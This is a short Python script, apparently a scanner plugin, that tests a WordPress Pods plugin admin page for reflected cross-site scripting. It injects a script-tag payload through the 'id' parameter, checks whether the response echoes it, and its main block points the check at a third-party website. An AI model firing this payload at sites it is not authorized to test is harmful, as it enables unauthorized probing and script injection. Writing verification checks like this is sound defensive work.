#Referer:	http://www.securityfocus.com/archive/1/534437
def assign(service, arg):
    if service == "wordpress":
        return True, arg

def audit(args):
    payload = 'wp-admin/admin.php?page=pods&action=edit&id=4%22></a><script>alert(1)</script><!--'
    verify_url = args + payload
    code, head, content, errcode,finalurl = curl.curl(verify_url)
    if code==200 and '<script>alert(1)</script>' in content:
        security_info(verify_url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('wordpress', 'http://www.misssky.cn/')[1])
